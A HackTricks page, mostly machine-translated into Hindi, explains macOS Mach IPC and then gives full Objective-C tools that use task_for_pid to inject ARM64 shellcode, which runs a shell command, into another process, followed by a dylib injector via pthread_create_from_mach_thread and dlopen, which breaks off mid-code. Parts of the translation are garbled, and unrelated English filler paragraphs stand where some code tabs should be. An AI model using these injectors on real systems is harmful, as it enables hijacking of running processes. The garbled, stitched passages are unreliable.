# macOS IPC - इंटर प्रोसेस कम्युनिकेशन

{% hint style="success" %}
AWS हैकिंग सीखें और प्रैक्टिस करें:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks प्रशिक्षण AWS रेड टीम एक्सपर्ट (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP हैकिंग सीखें और प्रैक्टिस करें: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks प्रशिक्षण GCP रेड टीम एक्सपर्ट (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>हैकट्रिक्स का समर्थन करें</summary>

* [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) की जाँच करें!
* **शामिल हों** 💬 [**डिस्कॉर्ड ग्रुप**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम ग्रुप**](https://t.me/peass) या हमें **ट्विटर** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** पर **फॉलो** करें।
* **हैकिंग ट्रिक्स साझा करें, PRs सबमिट करके** [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github रेपो में।

</details>
{% endhint %}

## पोर्ट के माध्यम से Mach संदेश

### मौलिक जानकारी

Mach **कार्यों** का उपयोग संसाधन साझा करने के लिए **सबसे छोटी इकाई** के रूप में करता है, और प्रत्येक कार्य में **कई धागे** हो सकते हैं। ये **कार्य और धागे 1:1 मैप किए जाते हैं POSIX प्रक्रियाओं और धागों के साथ**।

कार्यों के बीच संचार Mach इंटर-प्रोसेस कम्युनिकेशन (IPC) के माध्यम से होता है, जिसमें एक-तरफा संचार चैनल का उपयोग किया जाता है। **संदेश पोर्टों के बीच स्थानांतरित किए जाते हैं**, जो कर्नेल द्वारा प्रबंधित **संदेश कतारों** की तरह कार्य करते हैं।

प्रत्येक प्रक्रिया के पास एक **IPC तालिका** होती है, जिसमें प्रक्रिया के **mach पोर्ट** मिल सकते हैं। मच पोर्ट का नाम वास्तव में एक संख्या है (कर्नेल ऑब्जेक्ट के लिए एक पॉइंटर)।

एक प्रक्रिया एक पोर्ट नाम को कुछ अधिकारों के साथ **एक विभिन्न कार्य** में भेज सकती है और कर्नेल इसे **दूसरे कार्य की IPC तालिका में एंट्री बना देगा**।

### पोर्ट अधिकार

पोर्ट अधिकार, जो यह परिभाषित करते हैं कि एक कार्य किस कार्रवाई कर सकता है, इस संचार के लिए महत्वपूर्ण हैं। संभावित **पोर्ट अधिकार** हैं ([यहाँ से परिभाषाएँ](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)):

* **प्राप्ति अधिकार**, जो पोर्ट को भेजे गए संदेश प्राप्त करने की अनुमति देता है। Mach पोर्ट MPSC (एकाधिक उत्पादक, एक उपभोक्ता) कतारें होती हैं, जिसका मतलब है कि पूरे सिस्टम में हर पोर्ट के लिए केवल **एक प्राप्ति अधिकार हो सकता है** (जैसे कि पाइप में, जहां कई प्रक्रियाएँ एक ही पाइप के पढ़ने वाले अंत के लिए फ़ाइल डिस्क्रिप्टर्स धारण कर सकती हैं)।
* **प्राप्ति अधिकार वाला** एक कार्य संदेश प्राप्त कर सकता है और **सेंड अधिकार बना सकता है**, जिससे उसे संदेश भेजने की अनुमति मिलती है। मूल रूप से केवल **अपने कार्य के पास अपने पोर्ट पर प्राप्ति अधिकार होता है**।
* **सेंड अधिकार**, जो पोर्ट को संदेश भेजने की अनुमति देता है।
* सेंड अधिकार को **क्लोन** किया जा सकता है ताकि सेंड अधिकार वाले एक कार्य दूसरे कार्य को क्लोन कर सके और **उसे तीसरे कार्य को दे सके**।
* **एक बार सेंड अधिकार**, जो पोर्ट को एक संदेश भेजने की अनुमति देता है और फिर गायब हो जाता है।
* **पोर्ट सेट अधिकार**, जो एक _पोर्ट सेट_ को दर्शाता है बल्कि एक एकल पोर्ट। पोर्ट सेट से संदेश को निकालने पोर्ट में से एक संदेश निकालता है। पोर्ट सेट का उपयोग कई पोर्टों पर सुनने के लिए किया जा सकता है, Unix में `select`/`poll`/`epoll`/`kqueue` की तरह।
* **मृत नाम**, जो वास्तव में एक अधिकार नहीं है, बल्कि केवल एक जगहधारी है। जब एक पोर्ट नष्ट होता है, पोर्ट के सभी मौजूदा पोर्ट अधिकार मृत नाम में बदल जाते हैं।

**कार्य अन्यों को सेंड अधिकार स्थानांतरित कर सकते हैं**, जिससे उन्हें संदेश भेजने की अनुमति मिले। **सेंड अधिकार को क्लोन भी किया जा सकता है, ताकि एक कार्य उसे डुप्लिकेट करके तीसरे कार्य को दे सके**। इसके साथ, एक मध्यस्थ प्रक्रिया जिसे **बूटस्ट्रैप सर्वर** कहा जाता है, कार्यों के बीच प्रभावी संचार की अनुमति देता है।

### फाइल पोर्ट

फाइल पोर्ट फाइल डिस्क्रिप्टर्स को मैक पोर्ट में बंधने की अनुमति देते हैं (Mach पोर्ट अधिकार का उपयोग करके)। एक दिए गए FD से `fileport_makeport` का उपयोग करके `fileport` बनाना संभव है और `fileport_makefd` का उपयोग करके एक FD बनाना संभव है।

### संचार स्थापित करना

#### चरण:

जैसा कि उल्लिखित है, संचार चैनल स्थापित करने के लिए **बूटस्ट्रैप सर्वर** (**मैक में लॉन्चडी** में) शामिल है।

1. कार्य **A** एक **नया पोर्ट** प्रारंभ करता है, प्रक्रिया में **प्राप्ति अधिकार** प्राप्त करता है।
2. कार्य **A**, प्राप्ति अधिकार के धारक होने के नाते, पोर्ट के लिए **एक सेंड अधिकार उत्पन्न करता है**।
3. कार्य **A** एक **कनेक्शन स्थापित** करता है **बूटस्ट्रैप सर्वर** के साथ, पोर्ट की सेवा नाम और सेंड अधिकार प्रदान करते हुए बूटस्ट्रैप रजिस्टर नामक प्रक्रिया के माध्यम से।
4. कार्य **B** बूटस्ट्रैप सर्वर के साथ बातचीत करता है एक बूटस्ट्रैप **सेवा के लिए लुकअप** करने के लिए। यदि सफल होता है, तो **सर्वर SEND अधिकार** को डुप्लिकेट करता है जो कार्य A से प्राप्त किया गया था और **कार्य B को स्थानांतरित करता है**।
5. SEND अधिकार प्राप्त करने पर, कार्य **B** को **संदेश तैयार** करने और इसे **कार्य A** को भेजने की क्षमता होती है।
6. द्विदिशीय संचार के लिए सामान्यत: कार्य **B** एक नया पोर्ट उत्पन्न करता है जिसमें **प्राप्ति** अधिकार और **सेंड** अधिकार होता है, और **कार्य A को सेंड अधिकार देता है** ताकि वह कार
```c
typedef struct {
mach_msg_bits_t               msgh_bits;
mach_msg_size_t               msgh_size;
mach_port_t                   msgh_remote_port;
mach_port_t                   msgh_local_port;
mach_port_name_t              msgh_voucher_port;
mach_msg_id_t                 msgh_id;
} mach_msg_header_t;
```
Processes possessing a _**प्राप्ति अधिकार**_ मच पोर्ट पर संदेश प्राप्त कर सकते हैं। उल्टे, **भेजने वाले** को एक _**भेजें**_ या _**एक बार भेजें अधिकार**_ प्रदान किया जाता है। एक बार भेजें अधिकार केवल एक संदेश भेजने के लिए है, उसके बाद यह अमान्य हो जाता है।

एक सरल **द्विदिशीय संचार** प्राप्त करने के लिए एक प्रक्रिया मच **संदेश हेडर** में एक मच **पोर्ट** निर्दिष्ट कर सकती है जिसे _उत्तर पोर्ट_ (**`msgh_local_port`**) कहा जाता है जहां संदेश का **प्राप्तकर्ता** इस संदेश का उत्तर **भेज सकता है**। **`msgh_bits`** में बिटफ्लैग्स का उपयोग किया जा सकता है जो इस पोर्ट के लिए एक **एक बार भेजें** **अधिकार** का निर्माण और स्थानांतरित किया जाना चाहिए (`MACH_MSG_TYPE_MAKE_SEND_ONCE`).

{% hint style="success" %}
ध्यान दें कि इस प्रकार के द्विदिशीय संचार का उपयोग एक्सपीसी संदेशों में किया जाता है जो एक प्रतिक्रिया की उम्मीद रखते हैं (`xpc_connection_send_message_with_reply` और `xpc_connection_send_message_with_reply_sync`)। लेकिन **आम तौर पर विभिन्न पोर्ट बनाए जाते हैं** जैसा पहले स्पष्ट किया गया है द्विदिशीय संचार बनाने के लिए।
{% endhint %}

संदेश हेडर के अन्य फ़ील्ड हैं:

* `msgh_size`: पूरे पैकेट का आकार।
* `msgh_remote_port`: जिस पोर्ट पर यह संदेश भेजा गया है।
* `msgh_voucher_port`: [मच वाउचर](https://robert.sesek.com/2023/6/mach\_vouchers.html)।
* `msgh_id`: इस संदेश का आईडी, जिसे प्राप्तकर्ता द्वारा व्याख्या किया जाता है।

{% hint style="danger" %}
ध्यान दें कि **मच संदेश एक \_मच पोर्ट**\__ के माध्यम से भेजे जाते हैं, जो मच कर्नल में बनाया गया एक **एकल प्राप्तकर्ता**, **एकाधिक भेजने वाला** संचार चैनल है। **एकाधिक प्रक्रियाएँ** एक मच पोर्ट पर संदेश भेज सकती हैं, लेकिन किसी भी समय केवल **एक प्रक्रिया पढ़ सकती है**।
{% endhint %}

### पोर्टों की गणना
```bash
lsmp -p <pid>
```
आप इस टूल को iOS में इंस्टॉल कर सकते हैं, इसे [http://newosxbook.com/tools/binpack64-256.tar.gz](http://newosxbook.com/tools/binpack64-256.tar.gz) से डाउनलोड करके।

### कोड उदाहरण

नोट करें कि **भेजने वाला** एक पोर्ट आवंटित करता है, `org.darlinghq.example` नाम के लिए एक **भेजने का अधिकार** बनाता है और इसे **बूटस्ट्रैप सर्वर** को भेजता है जबकि भेजने वाला उस नाम के **भेजने का अधिकार** मांगता है और उसे उपयोग करता है एक **संदेश भेजने** के लिए।

{% tabs %}
{% tab title="receiver.c" %}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc receiver.c -o receiver

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Create a new port.
mach_port_t port;
kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
if (kr != KERN_SUCCESS) {
printf("mach_port_allocate() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_allocate() created port right name %d\n", port);


// Give us a send right to this port, in addition to the receive right.
kr = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
if (kr != KERN_SUCCESS) {
printf("mach_port_insert_right() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_insert_right() inserted a send right\n");


// Send the send right to the bootstrap server, so that it can be looked up by other processes.
kr = bootstrap_register(bootstrap_port, "org.darlinghq.example", port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_register() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_register()'ed our port\n");


// Wait for a message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
mach_msg_trailer_t trailer;
} message;

kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_RCV_MSG,     // Options. We're receiving a message.
0,                // Size of the message being sent, if sending.
sizeof(message),  // Size of the buffer for receiving.
port,             // The port to receive a message on.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Got a message\n");

message.some_text[9] = 0;
printf("Text: %s, number: %d\n", message.some_text, message.some_number);
}
```
{% endtab %}

{% tab title="sender.c" %}  
### macOS IPC (Inter-Process Communication)

#### macOS IPC Overview

Inter-Process Communication (IPC) mechanisms are essential for processes to communicate with each other. macOS provides several IPC mechanisms such as Mach ports, XPC services, UNIX domain sockets, and shared memory.

#### Mach Ports

Mach ports are a fundamental IPC mechanism in macOS. They allow processes to send messages and data between each other. Mach ports are used for various system functions and services, including inter-process communication.

#### XPC Services

XPC (XPC Services) is a lightweight IPC mechanism introduced in macOS. XPC allows processes to create and manage services, which can communicate with each other. XPC services are commonly used for system tasks and background services.

#### UNIX Domain Sockets

UNIX domain sockets are another IPC mechanism available in macOS. They allow communication between processes on the same system. UNIX domain sockets are widely used for local inter-process communication.

#### Shared Memory

Shared memory is a mechanism that allows processes to share memory segments. In macOS, shared memory can be used for efficient data exchange between processes. However, shared memory requires careful handling to prevent data corruption and security vulnerabilities.

Understanding macOS IPC mechanisms is crucial for developing secure and efficient inter-process communication in macOS applications.  
{% endtab %}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc sender.c -o sender

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Lookup the receiver port using the bootstrap server.
mach_port_t port;
kern_return_t kr = bootstrap_look_up(bootstrap_port, "org.darlinghq.example", &port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_look_up() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_look_up() returned port right name %d\n", port);


// Construct our message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
} message;

message.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
message.header.msgh_remote_port = port;
message.header.msgh_local_port = MACH_PORT_NULL;

strncpy(message.some_text, "Hello", sizeof(message.some_text));
message.some_number = 35;

// Send the message.
kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_SEND_MSG,    // Options. We're sending a message.
sizeof(message),  // Size of the message being sent.
0,                // Size of the buffer for receiving.
MACH_PORT_NULL,   // A port to receive a message on, if receiving.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Sent a message\n");
}
```
### विशेषाधिकारित पोर्ट

* **होस्ट पोर्ट**: यदि किसी प्रक्रिया के पास इस पोर्ट पर **भेजने** की अनुमति है तो वह **सिस्टम** के बारे में **जानकारी** प्राप्त कर सकता है (जैसे `host_processor_info`।)
* **होस्ट प्रिव पोर्ट**: इस पोर्ट पर **भेजने** के अधिकार वाली प्रक्रिया विशेषाधिकारित क्रियाएँ कर सकती है जैसे कर्नेल एक्सटेंशन लोड करना। **प्रक्रिया को रूट होना चाहिए** इस अनुमति को प्राप्त करने के लिए।
* इसके अतिरिक्त, **`kext_request`** API को बुलाने के लिए अन्य entitlements **`com.apple.private.kext*`** की आवश्यकता है जो केवल Apple binaries को दी जाती हैं।
* **कार्य नाम पोर्ट:** _कार्य पोर्ट_ का एक अनुग्रहित संस्करण। यह कार्य को संदर्भित करता है, लेकिन इसे नियंत्रित करने की अनुमति नहीं देता। इसके माध्यम से केवल `task_info()` उपलब्ध लगता है।
* **कार्य पोर्ट** (जिसे कर्नेल पोर्ट भी कहा जाता है)**:** इस पोर्ट पर भेजने के स्वीकृति के साथ कार्य को नियंत्रित करना संभव है (मेमोरी पढ़ना/लिखना, थ्रेड बनाना...।)
* कॉल करें `mach_task_self()` ताकि कॉलर कार्य के लिए इस पोर्ट का नाम प्राप्त कर सके। यह पोर्ट केवल **`exec()`** के अवरुद्ध है; `fork()` के साथ नया कार्य बनाया गया तो नया कार्य पोर्ट मिलता है (एक विशेष मामले के रूप में, एक कार्य को भी `exec()` के बाद एक नया कार्य पोर्ट मिलता है।) कार्य उत्पन्न करने और इसका पोर्ट प्राप्त करने का एकमात्र तरीका "पोर्ट स्वैप नृत्य" करना है जब `fork()` किया जा रहा हो।
* इस पोर्ट तक पहुंचने की प्रतिबंधाएं (बाइनरी `AppleMobileFileIntegrity` से `macos_task_policy` से):
* यदि ऐप के पास **`com.apple.security.get-task-allow` entitlement** है तो **एक ही उपयोगकर्ता से** प्रक्रियाएँ कार्य पोर्ट तक पहुंच सकती हैं (डीबगिंग के लिए Xcode द्वारा सामान्य रूप से जोड़ा जाता है)। **नोटराइजेशन** प्रक्रिया इसे उत्पादन रिलीज़ में नहीं देगी।
* **`com.apple.system-task-ports`** entitlement वाली ऐप किसी भी प्रक्रिया के लिए कार्य पोर्ट प्राप्त कर सकती है, केवल कर्नेल को छोड़कर। पुराने संस्करणों में इसे **`task_for_pid-allow`** कहा जाता था। यह केवल Apple एप्लिकेशन्स को प्रदान किया जाता है।
* **रूट किसी भी** हार्डन किए गए रनटाइम के साथ कंपाइल नहीं की गई ऐप्स के कार्य पोर्ट तक पहुंच सकता है** (और न केवल Apple से)।

### शैलकोड इन्जेक्शन थ्रेड के माध्यम से कार्य पोर्ट में

आप यहाँ से एक शैलकोड प्राप्त कर सकते हैं:

{% content-ref url="../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md" %}
[arm64-basic-assembly.md](../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md)
{% endcontent-ref %}

{% tabs %}
{% tab title="mysleep.m" %}
```objectivec
// clang -framework Foundation mysleep.m -o mysleep
// codesign --entitlements entitlements.plist -s - mysleep

#import <Foundation/Foundation.h>

double performMathOperations() {
double result = 0;
for (int i = 0; i < 10000; i++) {
result += sqrt(i) * tan(i) - cos(i);
}
return result;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
NSLog(@"Process ID: %d", [[NSProcessInfo processInfo]
processIdentifier]);
while (true) {
[NSThread sleepForTimeInterval:5];

performMathOperations();  // Silent action

[NSThread sleepForTimeInterval:5];
}
}
return 0;
}
```
{% endtab %}

{% tab title="entitlements.plist" %} 

### अधिकार (entitlements).plist

{% endtab %}
```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.get-task-allow</key>
<true/>
</dict>
</plist>
```
{% endtab %}
{% endtabs %}

**पिछली** प्रोग्राम को **कंपाइल** करें और **अधिकार** जोड़ें ताकि आप उसी उपयोगकर्ता के साथ कोड इंजेक्शन कर सकें (अगर नहीं तो आपको **sudo** का उपयोग करना होगा)।

<details>

<summary>sc_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit sc_injector.m -o sc_injector

#import <Foundation/Foundation.h>
#import <AppKit/AppKit.h>
#include <mach/mach_vm.h>
#include <sys/sysctl.h>


#ifdef __arm64__

kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128

// ARM64 shellcode that executes touch /tmp/lalala
char injectedCode[] = "\xff\x03\x01\xd1\xe1\x03\x00\x91\x60\x01\x00\x10\x20\x00\x00\xf9\x60\x01\x00\x10\x20\x04\x00\xf9\x40\x01\x00\x10\x20\x08\x00\xf9\x3f\x0c\x00\xf9\x80\x00\x00\x10\xe2\x03\x1f\xaa\x70\x07\x80\xd2\x01\x00\x00\xd4\x2f\x62\x69\x6e\x2f\x73\x68\x00\x2d\x63\x00\x00\x74\x6f\x75\x63\x68\x20\x2f\x74\x6d\x70\x2f\x6c\x61\x6c\x61\x6c\x61\x00";


int inject(pid_t pid){

task_t remoteTask;

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
return (-4);
}

// Set the permissions on the allocated stack memory
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
return (-4);
}

// Create thread to run shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // this is the real stack
//remoteStack64 -= 8;  // need alignment of 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}

pid_t pidForProcessName(NSString *processName) {
NSArray *arguments = @[@"pgrep", processName];
NSTask *task = [[NSTask alloc] init];
[task setLaunchPath:@"/usr/bin/env"];
[task setArguments:arguments];

NSPipe *pipe = [NSPipe pipe];
[task setStandardOutput:pipe];

NSFileHandle *file = [pipe fileHandleForReading];

[task launch];

NSData *data = [file readDataToEndOfFile];
NSString *string = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];

return (pid_t)[string integerValue];
}

BOOL isStringNumeric(NSString *str) {
NSCharacterSet* nonNumbers = [[NSCharacterSet decimalDigitCharacterSet] invertedSet];
NSRange r = [str rangeOfCharacterFromSet: nonNumbers];
return r.location == NSNotFound;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
if (argc < 2) {
NSLog(@"Usage: %s <pid or process name>", argv[0]);
return 1;
}

NSString *arg = [NSString stringWithUTF8String:argv[1]];
pid_t pid;

if (isStringNumeric(arg)) {
pid = [arg intValue];
} else {
pid = pidForProcessName(arg);
if (pid == 0) {
NSLog(@"Error: Process named '%@' not found.", arg);
return 1;
}
else{
printf("Found PID of process '%s': %d\n", [arg UTF8String], pid);
}
}

inject(pid);
}

return 0;
}
```
</details>  

### macOS IPC (Inter-Process Communication)

#### macOS IPC Overview

Inter-process communication (IPC) mechanisms are essential for processes to communicate with each other. macOS provides various IPC mechanisms such as Mach ports, XPC services, and UNIX domain sockets. Understanding how these mechanisms work is crucial for both developers and security researchers.
```bash
gcc -framework Foundation -framework Appkit sc_inject.m -o sc_inject
./inject <pi or string>
```
### Dylib Injection in thread via Task port

macOS में **threads** को **Mach** का उपयोग करके या **posix `pthread` api** का उपयोग करके मनिपुलेट किया जा सकता है। हमने पिछले इंजेक्शन में जिस thread को उत्पन्न किया था, वह Mach api का उपयोग करके उत्पन्न किया गया था, इसलिए **यह posix compliant नहीं है**।

एक सरल शैली को निष्पादित करने के लिए एक सरल शैली को **इंजेक्ट करना संभव था** ताकि एक कमांड को निष्पादित करने के लिए क्योंकि इसे **posix के साथ काम करने की आवश्यकता नहीं थी**। **अधिक जटिल इंजेक्शन** को भी **thread** को भी **posix compliant** होना चाहिए।

इसलिए, **thread** को सुधारने के लिए यह कहा जा सकता है कि **`pthread_create_from_mach_thread`** को कॉल करना चाहिए जो एक मान्य pthread बनाएगा। फिर, इस नए pthread को **dlopen को कॉल करना** चाहिए ताकि सिस्टम से एक dylib लोड किया जा सके, इसलिए नए shellcode लिखने की बजाय विभिन्न क्रियाएँ करने के लिए अपनी लाइब्रेरी लोड करना संभव है।

आप (उदाहरण के लिए जो एक लॉग उत्पन्न करता है और फिर आप इसे सुन सकते हैं) में **उदाहरण dylibs** पा सकते हैं:

{% content-ref url="../../macos-dyld-hijacking-and-dyld_insert_libraries.md" %}
[macos-dyld-hijacking-and-dyld\_insert\_libraries.md](../../macos-dyld-hijacking-and-dyld\_insert\_libraries.md)
{% endcontent-ref %}

<details>

<summary>dylib_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
// Based on http://newosxbook.com/src.jl?tree=listings&file=inject.c
#include <dlfcn.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <mach/mach.h>
#include <mach/error.h>
#include <errno.h>
#include <stdlib.h>
#include <sys/sysctl.h>
#include <sys/mman.h>

#include <sys/stat.h>
#include <pthread.h>


#ifdef __arm64__
//#include "mach/arm/thread_status.h"

// Apple says: mach/mach_vm.h:1:2: error: mach_vm.h unsupported
// And I say, bullshit.
kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128


char injectedCode[] =

// "\x00\x00\x20\xd4" // BRK X0     ; // useful if you need a break :)

// Call pthread_set_self

"\xff\x83\x00\xd1" // SUB SP, SP, #0x20         ; Allocate 32 bytes of space on the stack for local variables
"\xFD\x7B\x01\xA9" // STP X29, X30, [SP, #0x10] ; Save frame pointer and link register on the stack
"\xFD\x43\x00\x91" // ADD X29, SP, #0x10        ; Set frame pointer to current stack pointer
"\xff\x43\x00\xd1" // SUB SP, SP, #0x10         ; Space for the
"\xE0\x03\x00\x91" // MOV X0, SP                ; (arg0)Store in the stack the thread struct
"\x01\x00\x80\xd2" // MOVZ X1, 0                ; X1 (arg1) = 0;
"\xA2\x00\x00\x10" // ADR X2, 0x14              ; (arg2)12bytes from here, Address where the new thread should start
"\x03\x00\x80\xd2" // MOVZ X3, 0                ; X3 (arg3) = 0;
"\x68\x01\x00\x58" // LDR X8, #44               ; load address of PTHRDCRT (pthread_create_from_mach_thread)
"\x00\x01\x3f\xd6" // BLR X8                    ; call pthread_create_from_mach_thread
"\x00\x00\x00\x14" // loop: b loop              ; loop forever

// Call dlopen with the path to the library
"\xC0\x01\x00\x10"  // ADR X0, #56  ; X0 => "LIBLIBLIB...";
"\x68\x01\x00\x58"  // LDR X8, #44 ; load DLOPEN
"\x01\x00\x80\xd2"  // MOVZ X1, 0 ; X1 = 0;
"\x29\x01\x00\x91"  // ADD   x9, x9, 0  - I left this as a nop
"\x00\x01\x3f\xd6"  // BLR X8     ; do dlopen()

// Call pthread_exit
"\xA8\x00\x00\x58"  // LDR X8, #20 ; load PTHREADEXT
"\x00\x00\x80\xd2"  // MOVZ X0, 0 ; X1 = 0;
"\x00\x01\x3f\xd6"  // BLR X8     ; do pthread_exit

"PTHRDCRT"  // <-
"PTHRDEXT"  // <-
"DLOPEN__"  // <-
"LIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIB"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" ;




int inject(pid_t pid, const char *lib) {

task_t remoteTask;
struct stat buf;

// Check if the library exists
int rc = stat (lib, &buf);

if (rc != 0)
{
fprintf (stderr, "Unable to open library file %s (%s) - Cannot inject\n", lib,strerror (errno));
//return (-9);
}

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
